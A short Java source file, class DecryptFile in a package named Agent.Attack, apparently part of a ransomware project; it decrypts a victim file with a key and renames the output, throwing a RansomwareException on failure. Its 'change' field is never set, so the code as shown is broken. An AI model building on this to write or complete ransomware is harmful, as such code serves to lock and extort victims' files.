package Agent.Attack;

import java.io.File;

import Agent.EncryptionAlgo.ChangeFilesName;
import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;

public class DecryptFile implements Cryptable {
private ChangeFilesName change;
	@Override
	public void doingCrypto(CryptoKey key, File file, CryptoAlgorithm crypto) throws RansomwareException {
		try {
			crypto.decrypt(key.getKey(), file,change.decryptedOutputFile(file));
		} catch (RansomwareException e) {
			throw new RansomwareException(e.getMessage(), e.getCause());
		}

	}

}
